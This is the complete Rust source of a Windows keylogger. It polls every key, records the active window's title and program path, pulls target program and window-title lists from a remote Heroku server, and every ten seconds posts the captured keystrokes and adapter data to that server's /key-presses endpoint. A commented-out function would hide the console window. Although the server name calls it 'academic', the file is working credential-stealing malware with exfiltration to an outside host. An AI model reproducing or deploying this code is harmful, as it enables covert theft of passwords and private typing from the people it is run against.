mod bindings {
    ::windows::include_bindings!();
}

use std::{
    sync::mpsc::{self, Receiver, Sender},
    time::Duration,
};

use bindings::Windows::Win32::{
    IpHelper::{GetAdaptersInfo, IP_ADAPTER_INFO},
    KeyboardAndMouseInput::{GetAsyncKeyState, GetKeyboardLayout},
    ProcessStatus::K32GetProcessImageFileNameW,
    SystemServices::{OpenProcess, PROCESS_ACCESS_RIGHTS, PWSTR},
    WindowsAndMessaging::{
        GetForegroundWindow, GetWindowTextLengthW, GetWindowTextW, GetWindowThreadProcessId, HWND,
    },
    WindowsProgramming::CloseHandle,
};

use chrono::prelude::{DateTime, Utc};

use serde::{Deserialize, Serialize};

const MAX_NETWORK_ADAPTERS: usize = 16;
const API_URL: &str = "https://rust-academic-keylogger.herokuapp.com";

#[derive(Serialize, Debug)]
struct KeyLoggerPayload {
    mac_addresses: Vec<[i8; MAX_NETWORK_ADAPTERS]>,
    key_presses: Vec<KeyPressInfo>,
}

#[derive(Serialize, Debug)]
struct KeyPressInfo {
    timestamp: DateTime<Utc>,
    window_path: String,
    window_title: String,
    keyboard_layout: String,
    key_pressed: String,
}

#[derive(Deserialize)]
struct Program {
    name: String,
}

#[derive(Deserialize)]
struct Window {
    title: String,
}

fn virtual_key_code_to_string(virtual_key_code: i32) -> Option<String> {
    let is_key_a_digit = (0x30..=0x39).contains(&virtual_key_code);
    let is_key_a_letter = (0x41..=0x5a).contains(&virtual_key_code);
    if is_key_a_digit || is_key_a_letter {
        Some((virtual_key_code as u8 as char).to_string())
    } else {
        let virtual_key_code = match virtual_key_code {
            0x03 => "[VK_CANCEL]",
            0x08 => "[VK_BACK]",
            0x09 => "[VK_TAB]",
            0x0c => "[VK_CLEAR]",
            0x0d => "[VK_RETURN]",
            0x10 => "[VK_SHIFT]",
            0x11 => "[VK_CONTROL]",
            0x12 => "[VK_MENU]",
            0x13 => "[VK_PAUSE]",
            0x14 => "[VK_CAPITAL]",
            0x15 => "[VK_KANA|VK_HANGUEL|VK_HANGUL]",
            0x16 => "[VK_IME_ON]",
            0x17 => "[VK_JUNJA]",
            0x18 => "[VK_FINAL]",
            0x19 => "[VK_HANJA|VK_KANJI]",
            0x1a => "[VK_IME_OFF]",
            0x1b => "[VK_ESCAPE]",
            0x1c => "[VK_CONVERT]",
            0x1d => "[VK_NONCONVERT]",
            0x1e => "[VK_ACCEPT]",
            0x1f => "[VK_MODECHANGE]",
            0x20 => "[VK_SPACE]",
            0x21 => "[VK_PRIOR]",
            0x22 => "[VK_NEXT]",
            0x23 => "[VK_END]",
            0x24 => "[VK_HOME]",
            0x25 => "[VK_LEFT]",
            0x26 => "[VK_UP]",
            0x27 => "[VK_RIGHT]",
            0x28 => "[VK_DOWN]",
            0x29 => "[VK_SELECT]",
            0x2a => "[VK_PRINT]",
            0x2b => "[VK_EXECUTE]",
            0x2c => "[VK_SNAPSHOT]",
            0x2d => "[VK_INSERT]",
            0x2e => "[VK_DELETE]",
            0x2f => "[VK_HELP]",
            0x5b => "[VK_LWIN]",
            0x5c => "[VK_RWIN]",
            0x5d => "[VK_APPS]",
            0x5f => "[VK_SLEEP]",
            0x60 => "[VK_NUMPAD0]",
            0x61 => "[VK_NUMPAD1]",
            0x62 => "[VK_NUMPAD2]",
            0x63 => "[VK_NUMPAD3]",
            0x64 => "[VK_NUMPAD4]",
            0x65 => "[VK_NUMPAD5]",
            0x66 => "[VK_NUMPAD6]",
            0x67 => "[VK_NUMPAD7]",
            0x68 => "[VK_NUMPAD8]",
            0x69 => "[VK_NUMPAD9]",
            0x6a => "[VK_MULTIPLY]",
            0x6b => "[VK_ADD]",
            0x6c => "[VK_SEPARATOR]",
            0x6d => "[VK_SUBTRACT]",
            0x6e => "[VK_DECIMAL]",
            0x6f => "[VK_DIVIDE]",
            0x70 => "[VK_F1]",
            0x71 => "[VK_F2]",
            0x72 => "[VK_F3]",
            0x73 => "[VK_F4]",
            0x74 => "[VK_F5]",
            0x75 => "[VK_F6]",
            0x76 => "[VK_F7]",
            0x77 => "[VK_F8]",
            0x78 => "[VK_F9]",
            0x79 => "[VK_F10]",
            0x7a => "[VK_F11]",
            0x7b => "[VK_F12]",
            0x7c => "[VK_F13]",
            0x7d => "[VK_F14]",
            0x7e => "[VK_F15]",
            0x7f => "[VK_F16]",
            0x80 => "[VK_F17]",
            0x81 => "[VK_F18]",
            0x82 => "[VK_F19]",
            0x83 => "[VK_F20]",
            0x84 => "[VK_F21]",
            0x85 => "[VK_F22]",
            0x86 => "[VK_F23]",
            0x87 => "[VK_F24]",
            0x90 => "[VK_NUMLOCK]",
            0x91 => "[VK_SCROLL]",
            0x92 => "[VK_OEMS_1]",
            0x93 => "[VK_OEMS_2]",
            0x94 => "[VK_OEMS_3]",
            0x95 => "[VK_OEMS_4]",
            0x96 => "[VK_OEMS_6]",
            0xa6 => "[VK_BROWSER_BACK]",
            0xa7 => "[VK_BROWSER_FORWARD]",
            0xa8 => "[VK_BROWSER_REFRESH]",
            0xa9 => "[VK_BROWSER_STOP]",
            0xaa => "[VK_BROWSER_SEARCH]",
            0xab => "[VK_BROWSER_FAVORITES]",
            0xac => "[VK_BROWSER_HOME]",
            0xad => "[VK_VOLUME_MUTE]",
            0xae => "[VK_VOLUME_DOWN]",
            0xaf => "[VK_VOLUME_UP]",
            0xb0 => "[VK_MEDIA_NEXT_TRACK]",
            0xb1 => "[VK_MEDIA_PREV_TRACK]",
            0xb2 => "[VK_MEDIA_STOP]",
            0xb3 => "[VK_MEDIA_PLAY_PAUSE]",
            0xb4 => "[VK_LAUNCH_MAIL]",
            0xb5 => "[VK_LAUNCH_MEDIA_SELECT]",
            0xb6 => "[VK_LAUNCH_APP1]",
            0xb7 => "[VK_LAUNCH_APP2]",
            0xba => "[VK_OEM_1]",
            0xbb => "+",
            0xbc => ",",
            0xbd => "-",
            0xbe => "",
            0xbf => "[VK_OEM_2]",
            0xc0 => "[VK_OEM_3]",
            0xdb => "[VK_OEM_4]",
            0xdc => "[VK_OEM_5]",
            0xdd => "[VK_OEM_6]",
            0xde => "[VK_OEM_7]",
            0xdf => "[VK_OEM_8]",
            0xe1 => "[VK_OEMS_7]",
            0xe2 => "[VK_OEM_102]",
            0xe3 => "[VK_OEMS_8]",
            0xe4 => "[VK_OEMS_9]",
            0xe5 => "[VK_PROCESSKEY]",
            0xe6 => "[VK_OEMS_10]",
            0xe7 => "[VK_PACKET]",
            0xe9 => "[VK_OEMS_11]",
            0xea => "[VK_OEMS_12]",
            0xeb => "[VK_OEMS_13]",
            0xec => "[VK_OEMS_14]",
            0xed => "[VK_OEMS_15]",
            0xee => "[VK_OEMS_16]",
            0xef => "[VK_OEMS_17]",
            0xf0 => "[VK_OEMS_18]",
            0xf1 => "[VK_OEMS_19]",
            0xf2 => "[VK_OEMS_20]",
            0xf3 => "[VK_OEMS_21]",
            0xf4 => "[VK_OEMS_22]",
            0xf5 => "[VK_OEMS_23]",
            0xf6 => "[VK_ATTN]",
            0xf7 => "[VK_CRSEL]",
            0xf8 => "[VK_EXSEL]",
            0xf9 => "[VK_EREOF]",
            0xfa => "[VK_PLAY]",
            0xfb => "[VK_ZOOM]",
            0xfc => "[VK_NONAME]",
            0xfd => "[VK_PA1]",
            0xfe => "[VK_OEM_CLEAR]",
            _ => "",
        };
        if virtual_key_code.is_empty() {
            None
        } else {
            Some(virtual_key_code.to_string())
        }
    }
}

fn title_active_window(active_window_handle: HWND) -> String {
    let title_len = (unsafe { GetWindowTextLengthW(active_window_handle) }) as usize;
    let title_len_with_null = title_len + 1;
    if title_len > 0 {
        let mut title_buffer = vec![0; title_len_with_null];
        unsafe {
            GetWindowTextW(
                active_window_handle,
                PWSTR(title_buffer.as_mut_ptr()),
                title_len_with_null as i32,
            )
        };
        title_buffer.remove(title_buffer.len() - 1);
        String::from_utf16_lossy(&title_buffer)
    } else {
        "[NO_TITLE]".to_string()
    }
}

fn path_active_window(active_window_handle: HWND) -> String {
    let mut pid = 0;
    unsafe { GetWindowThreadProcessId(active_window_handle, &mut pid) };
    let process_handle = unsafe {
        OpenProcess(
            PROCESS_ACCESS_RIGHTS::PROCESS_QUERY_LIMITED_INFORMATION,
            false,
            pid,
        )
    };
    const MAX_LEN: usize = 1024;
    let mut path_buffer = vec![0; MAX_LEN];
    let path_len = unsafe {
        K32GetProcessImageFileNameW(
            process_handle,
            PWSTR(path_buffer.as_mut_ptr()),
            MAX_LEN as u32,
        ) as usize
    };
    unsafe { CloseHandle(process_handle) };
    String::from_utf16_lossy(&path_buffer[..path_len])
}

fn mac_addresses() -> Vec<[i8; MAX_NETWORK_ADAPTERS]> {
    let mut network_adapters = vec![IP_ADAPTER_INFO::default(); MAX_NETWORK_ADAPTERS];
    let mut network_adapters_size =
        (std::mem::size_of::<IP_ADAPTER_INFO>() * MAX_NETWORK_ADAPTERS) as u32;
    unsafe { GetAdaptersInfo(network_adapters.as_mut_ptr(), &mut network_adapters_size) };
    network_adapters
        .iter()
        .filter_map(|qwe| {
            (!qwe.Address.iter().all(|dfgd| *dfgd == 0)).then(|| qwe.IpAddressList.IpAddress.String)
        })
        .collect()
}

fn is_program_desired(program_names: &[String], window_path: &str) -> bool {
    program_names
        .iter()
        .any(|program_name| window_path.ends_with(program_name))
}

fn is_window_title_desired(window_titles: &[String], window_title: &str) -> bool {
    window_titles
        .iter()
        .any(|title| window_title.contains(title))
}

async fn send_server_key_presses_thread(rx: Receiver<KeyPressInfo>) {
    let sending_duration = Duration::from_secs(10);
    let retry_response_duration = Duration::from_secs(10);
    let http_client = reqwest::Client::new();
    loop {
        std::thread::sleep(sending_duration);
        let mut key_presses: Vec<KeyPressInfo> = vec![];
        while let Ok(kpi) = rx.try_recv() {
            key_presses.push(kpi)
        }
        let kl_payload = KeyLoggerPayload {
            mac_addresses: mac_addresses(),
            key_presses,
        };
        println!("sending payload to server");
        while http_client
            .post(format!("{}/key-presses", API_URL))
            .json(&kl_payload)
            .send()
            .await
            .is_err()
        {
            println!("retrying send payload to server");
            std::thread::sleep(retry_response_duration);
        }
    }
}

fn capture_client_keys(
    tx: &Sender<KeyPressInfo>,
    browser_exe_names: &[String],
    window_titles: &[String],
) {
    for virtual_key_code in 0..255 {
        let key_state = unsafe { GetAsyncKeyState(virtual_key_code) };
        let is_key_pressed = key_state as i32 & 0x8000 > 0;
        if is_key_pressed {
            let some_key_pressed = virtual_key_code_to_string(virtual_key_code);
            if let Some(key_pressed) = some_key_pressed {
                let active_window_handle = unsafe { GetForegroundWindow() };
                let window_path = path_active_window(active_window_handle);
                let window_title = title_active_window(active_window_handle);

                let will_key_press_be_recorded =
                    is_program_desired(&browser_exe_names, &window_path)
                        && is_window_title_desired(window_titles, &window_title);

                if will_key_press_be_recorded {
                    let keyboard_layout = unsafe { GetKeyboardLayout(0).0 };
                    let keyboard_layout = format!("{:b}", keyboard_layout);

                    let kpi = KeyPressInfo {
                        key_pressed,
                        window_title,
                        window_path,
                        keyboard_layout,
                        timestamp: Utc::now(),
                    };
                    tx.send(kpi).unwrap();
                }
            }
        }
    }
}

#[tokio::main]
async fn main() {
    let (tx, rx) = mpsc::channel::<KeyPressInfo>();
    tokio::spawn(send_server_key_presses_thread(rx));

    let browser_exe_names = reqwest::get(format!("{}/programs", API_URL))
        .await
        .unwrap()
        .json::<Vec<Program>>()
        .await
        .unwrap()
        .into_iter()
        .map(|program| program.name)
        .collect::<Vec<String>>();

    let window_titles = reqwest::get(format!("{}/windows", API_URL))
        .await
        .unwrap()
        .json::<Vec<Window>>()
        .await
        .unwrap()
        .into_iter()
        .map(|window| window.title)
        .collect::<Vec<String>>();

    let key_detection_duration = Duration::from_millis(50);
    loop {
        capture_client_keys(&tx, &browser_exe_names, &window_titles);
        std::thread::sleep(key_detection_duration);
    }
}

// fn stealth() {
//     let mut stealth: winapi::shared::windef::HWND;
//     unsafe {
//         winapi::um::consoleapi::AllocConsole();
//         stealth = winapi::um::winuser::FindWindowA(
//             std::ffi::CString::new("ConsoleWindowClass")
//                 .unwrap()
//                 .as_ptr(),
//             std::ptr::null(),
//         );
//         winapi::um::winuser::ShowWindow(stealth, 0);
//     }
// }
